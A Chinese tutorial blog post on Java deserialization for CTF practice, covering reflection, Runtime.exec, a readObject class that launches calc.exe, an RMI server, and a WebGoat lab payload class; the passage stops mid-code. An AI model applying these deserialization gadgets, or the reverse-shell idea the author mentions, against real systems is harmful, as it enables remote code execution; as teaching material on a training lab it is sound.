<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="9e628115fb895ac4d9b8ffc53e52377f">0x00 引言</h2>
<p>打比赛遇到了，之前学习反序列化的内容时就一直计划着将Java反序列化进行学习总结一下，就是在学习过程中遇到的问题以及一些CTF案例进行总结和记录。</p>
<h2 data-content="1" id="4ba583d29e33003db997af8a01e3d3e0">0x01 Java反序列化基础</h2>
<p>由于学了Java的只是了解代码，并不了解基层的代码执行情况，也就是Java代码如何运行，只有一些浅显的理解。在学习反序列化漏洞前也是对这部分基础进行了多一点的了解。</p>
<h3 data-content="1" id="b35434bd4bfb32e48a70ce5b7b0a7694">什么是JMX？</h3>
<p>JMX(Java Management Extensions)，就是Java的管理扩展。用来管理和检测Java程序。<br/>
JMX简单架构<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211103144637.png"/><br/>
管理系统是通过JMX来管理系统中的各种资源的。<br/>
JMX有的应用架构有三层</p>
<blockquote>
<p>分布层(Distributed layer)包含使管理系统和JMX代理通信的组件<br/>
代理层(Agent layer)包括代理和Mbean服务器<br/>
指令层(Instrumentation layer)包括代表可管理资源的MBean<br/>
PS：MBean：符合JMX规范的Java类</p>
</blockquote>
<p>JMX通知是Java对象，通过它可以从<code>MBean</code>和代理向那些注册了接受通知的对象发送通知。对接受事件感兴趣的对象是通知监听器，是实现了<code>javax.management.NotificationListener</code>接口的类<br/>
JMX提供了两种机制来为MBean提供监听器以注册来接受通知：</p>
<ul>
<li>实现<code>javax.management.NotificationBroadcaster</code>接口</li>
<li>继承<code>javax.management.NotificationBroadcasterSupport</code>类</li>
</ul>
<h3 data-content="1" id="d208241f90af47f367ecbd5d6d1cf3f8">本地Java虚拟机如何运行远程的Java虚拟机的代码</h3>
<p>Java代码运行时需要有jre，C/C++代码运行是编写好代码后在程序内存中运行，而Java是在特定的Java虚拟机中运行，在虚拟机中运行的好处就是可以跨平台。只需要编译一次，即可在任何存在Java环境的系统中运行jar包。这也就是Java十分方便的一点。<br/>
在Java虚拟机中，运行过程如下<br/>
先将Java代码编译成字节码(class文件)，这是虚拟机能够识别的指令，再由虚拟机内部将字节码翻译成机器码，所以我们只需要有Java字节码，就可以在不同平台的虚拟机中运行。<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211103152410.png"/><br/>
class文件被jdk所用的HotSpot虚拟机全部加载，将文件中的Java类放置在方法区，最后编译成机器码执行。</p>
<h3 data-content="1" id="7ddda520152761085f2d1863a475e657">Java反射</h3>
<p>反射：将类的属性和方法映射成相应的类。<br/>
获取class类的三种方法</p>
<ol>
<li>类名.class</li>
<li>对象名.getClass()</li>
<li>Class.forName("需要加载的类名")</li>
</ol>
<p>使用以上三种方法任意一个来获取特定的类的<code>class</code>类。即这个类对应的字节码</p>
<ul>
<li>调用<code>class</code>对象的<code>getConstructor(Class&lt;?&gt;... parameterTypes)</code>获取构造方法对象</li>
<li>调用构造方法类<code>Constructor</code>的<code>newInstance(Object.... initargs)</code>方法新建对象</li>
<li>调用<code>Class</code>对象的<code>getMethod(String name, Class&lt;?&gt;... parameterTypes)</code>获取方法对象<br/>
利用类对象创建对象</li>
</ul>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CreatObject</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">Class</span> <span class="n">UserClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"test.User"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">UserClass</span><span class="o">.</span><span class="na">getConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"m0re"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211105200256.png"/></p>
<p>基础反射(数组的反射)</p>
<p>Java反射的主要组成部分有4个，分别是<code>Class</code>, <code>Field</code>, <code>Constructor</code>, <code>Method</code><br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211103185210.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">game</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">){</span>
        <span class="kt">int</span> <span class="o">[]</span> <span class="n">a1</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]{</span><span class="mi">1</span><span class="o">,</span><span class="mi">2</span><span class="o">,</span><span class="mi">3</span><span class="o">};</span>
        <span class="kt">int</span> <span class="o">[]</span> <span class="n">a2</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">5</span><span class="o">];</span>
        <span class="kt">int</span> <span class="o">[][]</span> <span class="n">a3</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">2</span><span class="o">][</span><span class="mi">3</span><span class="o">];</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a1</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">==</span> <span class="n">a2</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">//true</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a1</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">//class [I</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a3</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">//class [[I</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">==</span> <span class="n">a3</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">());</span><span class="c1">//true</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a2</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">());</span><span class="c1">//class java.lang.Object</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>可以看出，不同的维，<code>class</code>不同，但是父类都是<code>Object</code><br/>
一维数组不能直接转换成<code>Object[]</code></p>
<p>一个例子<br/>
如果使用Java代码来执行系统命令。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">game</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"notepad.exe"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>执行的命令是打开记事本。<br/>
如果使用的idea进行编写代码的话，会发现这里的提示<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211103154815.png"/><br/>
一般正常的流程应当是，先进行实例化对象，再调用<code>exec()</code>方法。执行系统命令。</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>

<span class="n">runtime</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">"notepad.exe"</span><span class="o">);</span>
</pre></div>
<p>这部分的相应的反射代码实际上为</p>
<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">runtime</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{}).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>

<span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">runtime</span><span class="o">,</span> <span class="s">"notepad.exe"</span><span class="o">);</span>
</pre></div>
<p>getMethod("方法名", 方法类型)<br/>
invoke(某个对象实例, 传入参数)</p>
<p>第一句获取<code>runtime</code>的实例，方便被<code>invoke</code>调用。<br/>
第二句就是调用第一句生成的<code>runtime</code>实例化后的<code>exec()</code>方法</p>
<h3 data-content="1" id="90452aefb23b5e5a635f02207eaa810c">反序列化函数实例</h3>
<p>分别使用对象输入/输出流来实现序列化和反序列化操作<br/>
序列化：<code>ObjectOutputStream</code>类的<code>writeObject(Object obj)</code>方法，将对象序列化成字符串数据。<br/>
反序列化：<code>ObjectInputStream</code>类的<code>readObject(Object obj)</code>方法，将字符串数据反序列化长城对象。</p>
<blockquote>
<p>与php序列化等操作的原理类似。序列化的原理都为了实现数据的持久化，通过反序列化可以把数据永久的的保存在硬盘上。<br/>
利用序列化实现远程通信，即在网络上传递对象的字节序列。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="c1">// User.java</span>
<span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="kd">implements</span> <span class="n">Serializable</span><span class="o">{</span>
    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">(){</span>
        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">stream</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">stream</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc.exe"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="c1">//game.java</span>
<span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">game</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
        <span class="n">user</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"m0re"</span><span class="o">);</span>

        <span class="n">FileOutputStream</span> <span class="n">fout</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"user.bin"</span><span class="o">);</span>
        <span class="c1">// 打开user.bin作为文件</span>
        <span class="n">ObjectOutputStream</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">fout</span><span class="o">);</span>
        <span class="c1">//打开一个文件输入流</span>
        <span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">user</span><span class="o">);</span>
        <span class="c1">//文件输入序列化数据</span>
        <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="n">FileInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"user.bin"</span><span class="o">);</span>
        <span class="n">ObjectInputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">);</span>
        <span class="n">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>将User类中<code>Runtime.getRuntime().exec()</code>执行的弹出计算器的命令进行序列化，写入文件<code>user.bin</code>，然后在game.java中读取该文件并使用<code>readObject()</code>方法进行反序列化操作，执行了User中的系统命令，最终成功弹出计算器。<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211103211427.png"/><br/>
然后看user.bin文件结构<br/>
标志是<code>aced0005</code>，经过base64转换之后是<code>rO0AB</code>，这个在后面应用的时候就可以看出来。<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211105170728.png"/></p>
<h3 data-content="1" id="cd688a45f170fd759f0d0ff2eeaab512">序列化版本号和serialVersionUID</h3>
<p>JVM通过类名来区分Java类，类名不同的话，就判断不是同一个类，当类名相同时，JVM就会通过序列化版本号来区分Java类，如果序列化版本号相同就是同一个类，不同则为不同的类。</p>
<blockquote>
<p>理解：在一个班级中，老师确定一个学生首先是根据学生的姓名来区分，当然无法避免重名的情况，如果重名，则进一步使用学号来区分，学号是唯一的。</p>
</blockquote>
<p>在序列化一个对象时，如果没有指定序列化版本号，后期对这个类的源码进行修改并重新编译，会导致修改前后的序列化版本号不一致，因为如果一个类一开始没有指定序列化版本号的话，后面JVM重新指定一版本号给这个类的对象。否则会报错，并抛出异常<code>java.io.InvalidClassException</code><br/>
解决办法：</p>
<ol>
<li>从一开始就指定好一个版本号给即将序列化的类。</li>
<li>如果忘了指定版本号，那么就永远不要修改这个类，不要重新编译。</li>
</ol>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BadAttributeValueExpException</span> <span class="kd">extends</span> <span class="n">Exception</span>   <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="o">-</span><span class="mi">3105272988410493376L</span><span class="o">;</span>

<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="3920bccf33cfaaba443464e36b204223">RMI相关</h3>
<p>RMI(Remote Method Invocation)是远程方法调用<br/>
JNDI(Java Naming and Directory Interface)，Java命名与目录接口<br/>
JNDI中包含许多RMI，类似于JNDI是图书馆的书架，书架上有很多分类的书。这些书就相当于RMI记录。<br/>
<strong>实现一个RMI服务器</strong><br/>
定义好接口(interface)之后，继承了远程调式，</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">User</span> <span class="kd">extends</span> <span class="n">Remote</span><span class="o">{</span>
    <span class="n">String</span> <span class="nf">name</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
    <span class="kt">void</span> <span class="nf">sex</span><span class="o">(</span><span class="n">String</span> <span class="n">sex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
    <span class="kt">void</span> <span class="nf">nikename</span><span class="o">(</span><span class="n">Object</span> <span class="n">secondname</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">game</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">User</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">game</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">name</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">{</span>
        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">sex</span><span class="o">(</span><span class="n">String</span> <span class="n">sex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"you are a "</span><span class="o">+</span> <span class="n">sex</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">nikename</span><span class="o">(</span><span class="n">Object</span> <span class="n">secondname</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"your second name is "</span><span class="o">+</span> <span class="n">secondname</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.java.ctf</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"rmi://192.168.88.1:12581/User"</span><span class="o">;</span>
        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="k">new</span> <span class="n">game</span><span class="o">();</span>
        <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">12581</span><span class="o">);</span>
        <span class="n">Naming</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">user</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"the RMI Server is running....."</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>启动服务后，<code>LocateRegistry.createRegistry(12581);</code>在JNDI中注册该端口，启动并监听该端口。<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211106105253.png"/></p>
<p>这样就运行起来一个简单的RMI监听器</p>
<h2 data-content="1" id="5b194bb0241fd9eb5e668839109776b8">0x02 Java反序列化的利用</h2>
<h3 data-content="1" id="d3f92a8d041d7b4ac7664ca70b5f3169">webgoat中的反序列化</h3>
<p>挑战：以下输入框接收序列化对象（字符串）并对其进行反序列化。</p>
<div class="highlight"><pre><span></span>rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l
</pre></div>
<p>尝试更改此序列化对象，以便将页面响应延迟 5 秒。</p>
<blockquote>
<p>JAVAWEB特征可以作为序列化的标志参考:<br/>
一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br/>
或者如果以aced开头，那么他就是这一段java序列化的16进制。</p>
</blockquote>
<p>反编译得到源码，查看<code>BOOT-INF/lib/insecure-deserialization-8.2.2.jar</code>，编码是base64<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211106181632.png"/><br/>
找它的切入点，也就是反序列化的位置<br/>
然后追踪到<code>VulnerableTaskHolder.java</code>的代码中，但是在jd-gui中无法访问，所以就直接去GitHub中找源码，发现了这里，只允许使用ping和sleep函数来让系统进行延时。<br/>
<img src="https://gitee.com/m0re/picture/raw/master/img/20211106183945.png"/></p>
<p>自定义一个恶意类，其中写入反弹shell的命令或者按照靶场的指示进行延时5s。</p>
<div class="highlight"><pre><span></span><span class="c1">//evil.java</span>

<span class="kd">class</span> <span class="nc">evil</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
    <span class="c1">// readObject()</span>
    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
        <span class="n">in</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">5000</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>小tips：进行payload生成时，需要先反编译源码，把源码找出来，不管是CTF还是此靶场。<br/>
然后生成payload的自建恶意类也需要在这里面创建。不然反序列化出的payload不可用。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.dummy.insecure.framework</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.time.LocalDateTime</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">VulnerableTaskHolder</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span>

    <span class="kd">private</span> <span class="n">String</span> <span class="n">taskName</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">String</span> <span class="n">taskAction</span><span class="o">;</span>
    <span class="kd">private</span> <span class="n">LocalDateTime</span> <span class="n">requestedExecutionTime</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">VulnerableTaskHolder</span><span class="o">(</span><span class="n">String</span> <span class="n">taskName</span><span class="o">,</span> <span class="n">String</span> <span class="n">taskAction</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
        <span class="k">this</span><span class="o">.</span><span class="na">taskName</span> <span class="o">=</span> <span class="n">taskName</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">taskAction</span> <span class="o">=</span> <span class="n">taskAction</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">requestedExecutionTime</span> <span class="o">=</span> <span class="n">LocalDateTime</span><span class="o">.</span><span class="na">now</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"org.dummy.insecure.framework.VulnerableTaskHolder [taskName="</span> <span class="o">+</span> <span class="n">taskName</span> <span class="o">+</span> <span class="s">", taskAction="</span> <span class="o">+</span> <span class="n">taskAction</span> <span class="o">+</span> <span class="s">", requestedExecutionTime="</span>
                <span class="o">+</span> <span class="n">requestedExecutionTime</span> <span class="o">+</span> <span class="s">"]"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="cm">/**</span>
<span class="cm">     * Execute a task when de-serializing a saved or received object.</span>
<span class="cm">     * @author stupid develop</span>
<span class="cm">     */</span>
    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span> <span class="n">ObjectInputStream</span> <span class="n">stream</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="c1">//unserialize data so taskName and taskAction are available</span>
        <span class="n">stream</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>

        <span class="c1">//do something with the data</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"restoring task: "</span><span class="o">+</span><span class="n">taskName</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"restoring time: "</span><span class="o">+</span><span class="n">requestedExecutionTime</span><span class="o">);</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">requestedExecutionTime</span><span class="o">!=</span><span class="kc">null</span> <span class="o">&amp;&amp;</span>
                <span class="o">(</span><span class="n">requestedExecutionTime</span><span class="o">.</span><span class="na">isBefore</span><span class="o">(</span><span class="n">LocalDateTime</span><span class="o">.</span><span class="na">now</span><span class="o">().</span><span class="na">minusMinutes</span><span class="o">(</span><span class="mi">10</span><span class="o">))</span>
                        <span class="o">||</span> <span class="n">requestedExecutionTime</span><span class="o">.</span><span class="na">isAfter</span><span class="o">(</span><span class="n">LocalDateTime</span><span class="o">.</span><span class="na">now</span><span class="o">())))</span> <span class="o">{</span>
            <span class="c1">//do nothing is the time is not within 10 minutes after the object has been created</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"outdated"</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="c1">//condition is here to prevent you from destroying the goat altogether</span>
        <span class="k">if</span> <span class="o">((</span><span class="n">taskAction</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"sleep"</span><span class="o">)||</span><span class="n">taskAction</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"ping"</span><span class="o">))</span>
                <span class="o">&amp;&amp;</span> <span class="n">taskAction</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">22</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"about to execute: "</span><span class="o">+</span><span class="n">taskAction</span><span class="o">);</span>
            <span class="k">try</span> <span class="o">{</span>
